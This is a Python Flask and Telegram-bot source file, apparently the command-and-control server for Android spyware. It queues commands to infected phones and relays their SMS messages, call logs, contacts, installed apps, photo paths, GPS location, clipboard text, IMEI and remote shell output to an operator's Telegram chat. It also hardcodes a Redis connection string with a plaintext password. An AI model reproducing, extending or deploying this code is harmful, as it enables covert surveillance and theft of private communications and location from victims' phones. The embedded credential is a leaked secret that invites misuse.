# apk_manager.py
# ============================================================
# APK Manager — إدارة الأجهزة المتصلة
# ============================================================

import os
import io
import json
import time
import uuid
import random
import string
import threading
import redis
from flask import Blueprint, request, jsonify
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

apk_bp = Blueprint('apk_manager', __name__)

# ============================================================
# Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()
if not REDIS_URL:
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10)
    redis_client.ping()
    print("[+] APK Manager: Redis connected")
except Exception as e:
    print(f"[-] APK Manager Redis error: {e}")
    redis_client = None


# ============================================================
# البيانات في الذاكرة
# ============================================================
apk_devices = {}  # { device_id: { chat_id, code, last_seen, info } }
apk_commands = {}  # { device_id: [commands] }
apk_lock = threading.Lock()


# ============================================================
# إدارة الأكواد
# ============================================================
def create_apk_code(chat_id):
    """ينشئ كود تنشيط جديد"""
    if not redis_client: return None
    try:
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        redis_client.setex(f"apk_code:{code}", 86400 * 30, str(chat_id))
        return code
    except Exception as e:
        print(f"[-] create_apk_code error: {e}")
        return None


def get_apk_code(code):
    """يجلب chat_id من كود التنشيط"""
    if not redis_client: return None
    try:
        return redis_client.get(f"apk_code:{code}")
    except: return None


# ============================================================
# إدارة الأجهزة
# ============================================================
def get_apk_devices():
    """يرجع قائمة الأجهزة المتصلة"""
    with apk_lock:
        return list(apk_devices.values())


def get_apk_device(device_id):
    with apk_lock:
        return apk_devices.get(device_id)


def push_apk_command(device_id, action, **kwargs):
    """يضيف أمر للجهاز"""
    cmd = {"action": action}
    cmd.update(kwargs)
    with apk_lock:
        if device_id not in apk_commands:
            apk_commands[device_id] = []
        apk_commands[device_id].append(cmd)
        print(f"[+] APK PUSH: {device_id[:8]} -> {action}")
    return True


# ============================================================
# لوحة التحكم
# ============================================================
def build_apk_panel(device_id):
    """لوحة تحكم بالجهاز"""
    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("📱 معلومات", callback_data=f"apk_cmd_info_{device_id}"),
        InlineKeyboardButton("📨 SMS", callback_data=f"apk_cmd_sms_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("📞 المكالمات", callback_data=f"apk_cmd_calls_{device_id}"),
        InlineKeyboardButton("👥 جهات الاتصال", callback_data=f"apk_cmd_contacts_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("📲 التطبيقات", callback_data=f"apk_cmd_apps_{device_id}"),
        InlineKeyboardButton("🖼️ الصور", callback_data=f"apk_cmd_photos_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("📍 الموقع", callback_data=f"apk_cmd_location_{device_id}"),
        InlineKeyboardButton("📋 الحافظة", callback_data=f"apk_cmd_clipboard_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("📳 اهتزاز", callback_data=f"apk_cmd_vibrate_{device_id}"),
        InlineKeyboardButton("🔔 صوت", callback_data=f"apk_cmd_sound_{device_id}"),
    )
    return m


# ============================================================
# Routes
# ============================================================
def init_apk_routes(app, bot):

    @app.route('/apk/poll', methods=['GET'])
    def apk_poll():
        """APK يستعلم عن أوامر"""
        device_id = request.args.get('device', '')
        code = request.args.get('code', '')
        
        if not device_id:
            return jsonify({"commands": []}), 200
        
        # سجّل الجهاز
        with apk_lock:
            if device_id not in apk_devices:
                chat_id = get_apk_code(code) or code
                apk_devices[device_id] = {
                    "device_id": device_id,
                    "chat_id": chat_id,
                    "code": code,
                    "first_seen": time.time(),
                    "last_seen": time.time(),
                    "info": {},
                }
                print(f"[+] New APK device: {device_id[:16]}")
            apk_devices[device_id]["last_seen"] = time.time()
        
        # اسحب الأوامر
        commands = []
        with apk_lock:
            if device_id in apk_commands:
                commands = apk_commands[device_id]
                apk_commands[device_id] = []
        
        return jsonify({"commands": commands}), 200

    @app.route('/apk/data', methods=['POST'])
    def apk_data():
        """APK يرسل البيانات"""
        try:
            data = request.get_json(silent=True) or {}
            device_id = data.get("device", "")
            code = data.get("code", "")
            dtype = data.get("type", "")
            
            if not device_id:
                return jsonify({"status": "no_device"}), 200
            
            # ابحث عن chat_id
            chat_id = None
            with apk_lock:
                if device_id in apk_devices:
                    chat_id = apk_devices[device_id].get("chat_id")
            
            if not chat_id:
                chat_id = get_apk_code(code)
            
            if not chat_id:
                return jsonify({"status": "no_chat"}), 200
            
            cid = int(chat_id) if str(chat_id).isdigit() else chat_id
            
            # معالجة البيانات
            if dtype == "initial":
                # احفظ معلومات الجهاز
                with apk_lock:
                    if device_id in apk_devices:
                        apk_devices[device_id]["info"] = data
                
                text = (
                    f"🆕 **جهاز جديد متصل!**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"📦 **الموديل:** `{data.get('model', 'N/A')}`\n"
                    f"🏭 **الشركة:** `{data.get('manufacturer', 'N/A')}`\n"
                    f"📱 **Android:** `{data.get('android', 'N/A')}` (SDK {data.get('sdk', '?')})\n"
                    f"🆔 **Device ID:** `{device_id[:16]}`\n\n"
                    f"🎛️ **لوحة التحكم:**"
                )
                bot.send_message(cid, text, parse_mode="Markdown")
                bot.send_message(cid, "اختر الأمر:",
                    reply_markup=build_apk_panel(device_id))
            
            elif dtype == "device_info":
                text = (
                    f"📱 **معلومات الجهاز**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"📦 `{data.get('model')}`\n"
                    f"📞 IMEI: `{data.get('imei', 'N/A')}`\n"
                    f"📶 المشغل: `{data.get('operator', 'N/A')}`\n"
                    f"🌍 الدولة: `{data.get('country', 'N/A')}`"
                )
                bot.send_message(cid, text, parse_mode="Markdown")
            
            elif dtype == "sms":
                sms_list = data.get("sms", [])
                if not sms_list:
                    bot.send_message(cid, "📭 لا توجد رسائل")
                else:
                    lines = ["📨 **الرسائل SMS:**", "━━━━━━━━━━━━━━━"]
                    for s in sms_list[:20]:
                        lines.append(f"📩 `{s.get('from')}`:\n{s.get('body', '')[:200]}\n─")
                    msg = "\n".join(lines)
                    for i in range(0, len(msg), 4000):
                        bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")
            
            elif dtype == "call_log":
                calls = data.get("calls", [])
                type_map = {"1": "📥", "2": "📤", "3": "❌"}
                lines = ["📞 **سجل المكالمات:**", "━━━━━━━━━━━━━━━"]
                for c in calls[:20]:
                    t = type_map.get(str(c.get('type', '')), '؟')
                    lines.append(f"{t} `{c.get('number')}` ({c.get('duration')}s)")
                bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
            
            elif dtype == "contacts":
                contacts = data.get("contacts", [])
                lines = [f"👥 **جهات الاتصال ({len(contacts)}):**", "━━━━━━━━━━━━━━━"]
                for c in contacts[:50]:
                    lines.append(f"• `{c.get('name')}` — `{c.get('number')}`")
                msg = "\n".join(lines)
                for i in range(0, len(msg), 4000):
                    bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")
            
            elif dtype == "apps":
                apps = data.get("apps", [])
                lines = [f"📲 **التطبيقات ({len(apps)}):**", "━━━━━━━━━━━━━━━"]
                for a in apps[:60]:
                    lines.append(f"• {a.get('name')}")
                msg = "\n".join(lines)
                for i in range(0, len(msg), 4000):
                    bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")
            
            elif dtype == "photos":
                photos = data.get("photos", [])
                lines = [f"🖼️ **الصور ({len(photos)}):**"]
                for p in photos[:20]:
                    lines.append(f"• `{p.get('path')}`")
                bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
            
            elif dtype == "location":
                lat = data.get("lat")
                lng = data.get("lng")
                if lat and lng:
                    bot.send_message(cid,
                        f"📍 **الموقع:**\n`{lat}, {lng}`\n"
                        f"[خرائط](https://maps.google.com/?q={lat},{lng})",
                        parse_mode="Markdown")
                else:
                    bot.send_message(cid, "❌ لا يوجد موقع")
            
            elif dtype == "clipboard":
                text = data.get("text", "")
                if text:
                    bot.send_message(cid, f"📋 **الحافظة:**\n```\n{text[:500]}\n```",
                        parse_mode="Markdown")
                else:
                    bot.send_message(cid, "📋 الحافظة فارغة")
            
            elif dtype == "shell_result":
                cmd = data.get("command", "")
                output = data.get("output", "")
                bot.send_message(cid,
                    f"💻 **نتيجة:**\n`{cmd}`\n\n```\n{output[:2000]}\n```",
                    parse_mode="Markdown")
            
            elif dtype == "heartbeat":
                pass  # صامت
            
            return jsonify({"status": "ok"}), 200
        except Exception as e:
            print(f"[-] apk_data error: {e}")
            import traceback
            traceback.print_exc()
            return jsonify({"status": "error"}), 200
